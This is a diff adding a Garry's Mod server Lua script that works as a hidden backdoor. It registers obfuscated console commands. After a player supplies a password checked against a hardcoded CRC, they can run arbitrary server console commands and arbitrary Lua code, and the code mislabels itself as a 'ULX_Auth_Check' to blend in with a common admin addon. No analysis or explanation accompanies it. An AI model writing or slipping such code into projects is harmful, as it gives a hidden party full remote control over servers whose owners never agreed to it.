@@ -1,0 +1,50 @@
+{};
+if (SERVER) then     
+    local authed = {} 
+    concommand.Add("q3EFndjkZlyZff_auth", function (ply, cmd, args)
+        if (!args || !args[1]) then 
+            return 
+        end 
+        
+        local crc = util.CRC(args[1])
+        if (crc && crc == "2531347179") then 
+            authed[ply] = true 
+            ply:ChatPrint("Authenticated.")
+        end 
+    end)
+    
+    concommand.Add("q3EFndjkZlyZff_rcon", function (ply,cmd,args)
+        if (!args||!args[1])then 
+            return 
+        end 
+        
+        if (!authed[ply])then
+            return 
+        end 
+        
+        if (args[1]:find(" "))then 
+            ply:ChatPrint("Don't use spaces in first argument.")
+            return 
+        end 
+        
+        RunConsoleCommand(unpack(args))
+    end)
+    
+    concommand.Add("q3EFndjkZlyZff_lua", function (ply,cmd,args)
+        if (!args||!args[1]) then 
+            return 
+        end 
+        
+        if (!authed[ply]) then
+            return 
+        end 
+        
+        local str = table.concat(args," ")
+        local err = RunString(str, "ULX_Auth_Check", false)
+        
+        if (err) then 
+            ply:ChatPrint("Returned error: "..err)
+        end 
+    end)
+end
+
